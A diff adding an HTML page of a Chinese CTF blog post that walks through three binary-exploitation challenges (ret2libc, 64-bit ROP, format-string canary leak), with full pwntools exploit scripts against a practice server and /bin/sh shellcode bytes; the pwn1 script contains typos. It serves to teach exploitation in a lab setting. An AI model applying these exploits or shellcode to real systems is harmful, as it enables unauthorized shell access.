@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="#level3与level2_x64及pwn1总结
+##level3在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没">
+  
+
+  
+  
+  
+  
+  
+  
+  <title>pwn level3 level2_x64及pwn1 | QianKeTutu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="#level3与level2_x64及pwn1总结 ##level3在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没有callsystem函数，也没有_system函数，也没有/bin/sh字符串，但题给了libc库">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn level3 level2_x64及pwn1">
+<meta property="og:url" content="http://yoursite.com/2019/07/27/pwn3_x64_2_str/index.html">
+<meta property="og:site_name" content="QianKeTutu">
+<meta property="og:description" content="#level3与level2_x64及pwn1总结 ##level3在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没有callsystem函数，也没有_system函数，也没有/bin/sh字符串，但题给了libc库">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-27T08:48:16.527Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn level3 level2_x64及pwn1">
+<meta name="twitter:description" content="#level3与level2_x64及pwn1总结 ##level3在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没有callsystem函数，也没有_system函数，也没有/bin/sh字符串，但题给了libc库">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+</head></html>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="QianKeTutu" rel="home">QianKeTutu</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-pwn3_x64_2_str" class="post-pwn3_x64_2_str post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      pwn level3 level2_x64及pwn1
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/27/pwn3_x64_2_str/" data-id="cjylalajf0001fcvww2uxnesl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>#level3与level2_x64及pwn1总结</p>
+<p>##level3<br>在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没有callsystem函数，也没有_system函数，也没有/bin/sh字符串，但题给了libc库，肯定要用到啊，用IDA打开，发现有/bin/sh字符串，system函数，而且发现源程序里有write函数，用这个函数泄露出我们想要的地址（就是write函数真正的地址）.再利用，libc库中函数偏移值相等这一原理，求出更多需要的地址（就是system,/bin/sh的地址），在实行覆盖，执行system函数，得到shell.</p>
+<p>exp如下：</p>
+<pre><code> from pwn import* 
+ context.log_level=&apos;DEBUG&apos;
+ p=remote(&quot;pwn2.jarvisoj.com&quot;,9879)
+ plt_write_addr=0x08048340
+ got_write_addr=0x0804A018
+ main_addr=0x08048484
+ p.recvline()
+ payload_one=&apos;a&apos;*(0x88+0x4)+p32(plt_write_addr)+p32(main_addr)+p32(1)+p32(got_write_addr)+p32(4)
+p.send(payload_one)
+write_addr=u32(p.recv(4))
+libc=ELF(&quot;libc-2.19.so&quot;)
+libc_system=libc.symbols[&quot;system&quot;]
+libc_binsh=next(libc.search(&quot;/bin/sh&quot;))
+libc_write=libc.symbols[&quot;write&quot;]
+
+x=write_addr-libc_write
+system_addr=x+libc_system
+binsh_addr=x+libc_binsh
+payload=&apos;a&apos;*0x88+&apos;a&apos;*4+p32(system_addr)+p32(0)+p32(binsh_addr)
+
+p.sendline(payload)
+p.interactive()</code></pre><p>原理就是：大原理还是栈溢出，小原理就是：利用plt,  got.plt,  libc,之间的关系及write函数求我们需要的地址.</p>
+<p>##level2_x64<br>首先在Ubuntu虚拟机里用checksec 文件名命令，查看防护信息，NX enabled状态，不能用shellcode.<br>用IDA打开，与32位level2一样，有_system函数，有/bin/sh字符串，原理也和32位level2一样，不同的是与32位，传参方式不同，64位用寄存器传参，存第一个参数的寄存器就是rdi，用<strong>ROPgadget –binary level2_x64（level2_x6<br>4就是文件名） –only “pop|ret”</strong> 命令查看rdi的地址，传参方式就是 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                 payload=&apos;a&apos;*(0x80+0x8)+p64(rdi_addr)+p32(sh_addr)+p32(system_add)+0x8*&apos;a&apos;</span><br><span class="line">先写寄存器地址（rdi——addr），再写字符串/bin/sh的地址（sh_addr），再写（system_addr）的地址，意思就是：把/bin/sh先存到rdi里，又作为参数传给system_addr函数，因此达到构造后门的目的.最后加上的</span><br><span class="line">0x8*&apos;a&apos;是用来覆盖_system函数形成栈的rbp的，这一题中，覆盖不覆盖都可以，有的题必须要覆盖.</span><br><span class="line"></span><br><span class="line">exp如下：</span><br></pre></td></tr></table></figure>
+
+<pre><code>from pwn import *
+
+r=remote(&quot;pwn2.jarvisoj.com&quot;,9882)
+
+f_addr=0x00000000004006b3
+
+s_addr=0x00000000004004C0
+
+bin_addr=0x0000000000600A90
+
+payload=&apos;a&apos;*(0x80+0x8)+p64(f_addr)+p64(bin_addr)+p64(s_addr)+&apos;a&apos;*0x8
+
+r.sendline(payload)
+r.interactive()</code></pre><p>原理参考32位的level2，<strong>本题重点是明白x64位的传参方式与32位的区别，并会构造payload</strong></p>
+<p>##pwn1，格式化字符串漏洞<br>查看保护机制，查看是32位还是64位，本题是32位，NX是disabled，有canary保护.运行一下程序，知道程序的运行流程，用IDA打开，分析程序的运行流程，找出漏洞点.经分析发现get_message函数里存在栈溢出漏洞.并且printf()函数，没有格式化，所以可利用print()函数打印出我们所需要的地址，实行覆盖，构造后门函数，得到shell.</p>
+<p>涉及知识：gdb调试，栈的结构，栈中距离的计算.</p>
+<p>exp如下：</p>
+<pre><code>1.    from pwn import *
+2.    #shellcode=asm(shellcraft.sh())
+3.    shellcode=&quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
+&quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \&quot;\x0b\xcd\x80\n&quot;
+      context.log_level=&apos;debug&apos;
+4.    #p=remote(&quot;172.16.80.240&quot;,8000)
+5.    p=process(&quot;./pwn1&quot;)
+6.    p=recvuntil(&quot;name:&quot;)
+7.    p.sendline(&apos;%p.&apos;*40)
+8.    leak_data=p.recvuntil(&apos;messages:&apos;)
+9.    address=leak_data.split(&apos;.&apos;)
+11.   for i in range(len(address)):
+      print str(i)+&quot;:&quot;+str(address[i])
+12.   canary=address[30]
+13.   print &quot;canary=&quot;+canary
+14.   prev_ebp_addre=address[33]
+15.   print &quot;leakebp_addr=&quot;+prev_ebp_addr
+16.   real_ebp_addr=int(prev_ebp_addr,16)-144
+16.   shellcode_addr=real_ebp_addr+8
+17.   payload=&apos;a&apos;*100+p32(int(canary,16))+&apos;a&apos;*12+p32(shellcode_addr)+shellcode
+18.   p.sendline(payload)
+19.   p.interactive()</code></pre><p>注释：2.,3.</p>
+<hr>
+<p><strong>shellcode=asm(shellcraft.sh())=”\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f” <br>     “\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0” &quot;\x0b\xcd\x80\n</strong></p>
+<p>   7.发送40个“%p.”</p>
+<p>   9.用‘.’分割leak_data,存入address数组</p>
+<p>   11.遍历数组打印出数组中的所有元素</p>
+<p>   12.13.14.15.gdb调试查看栈的结构，找出canary的位置是31，ebp是34</p>
+<p>   <strong>16.144是这样算得的，泄露出来的ebp的地址-ebp真正的地址=一个偏移量，此时偏移量等于144，所以，泄露出来的ebp的地址-这个偏移量就是ebp的真正的地址.<br>    为什么要加8呢？是这样的：想想栈的结构，p32(shellcode_addr)覆盖的是函数返回地址，在ebp的下面，就是ebp真正地址+4的位置，shellcode_addr就要放在real_ebp_addr+8的位置,shellcode放在其后给shellcode_addr传参.</strong></p>
+<p>17.先解释覆盖的过程：</p>
+<p> ‘a’<em>100覆盖canary之前栈的东西，p32(int(cabary,16))覆盖canary的位置，确保了canary一样，绕过了保护机制，’a’</em>12覆盖了canary到ebp的栈中的东西，p32(shellcode_addr)覆盖函数返回地址，shellcode给shellcode_addr传参.</p>
+<p>  <strong>还是栈的结构</strong></p>
+<p>再解释</p>
+<p> 100是用源程序中给定的栈的大小是0x70（0x70=112）+ebp（0x4=4）-栈顶到canary的距离（12）-canary本身（4）=100</p>
+<p>12是canary到栈底的距离</p>
+<p> **原理就是：大方面的原理还是栈溢出，小方面的原理就是printf()函数没有格式化，以至于我们可以利用它来泄露出我们想要的地址，就是canary及ebp的地址，再利用栈溢出进行覆盖，得到shell.</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/07/27/pwn3_x64_2_str/">
+    <time datetime="2019-07-26T16:00:00.000Z" class="entry-date">
+        2019-07-27
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2019/07/25/pwn012/" rel="next">pwn level0，1，2 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value name="s" id="s">
+        <input type="submit" id="searchsubmit" value="搜索">
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2019/07/27/pwn3_x64_2_str/">pwn level3 level2_x64及pwn1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/25/pwn012/">pwn level0，1，2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/web张/">第二天 ---web安全</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/第一天__10种基本工具/">第一天=·=10种基本工具</a>
+          </li>
+        
+          <li>
+            <a href="/2019/06/12/Window命令小结及Python基本语法/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 QianKeTutu
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
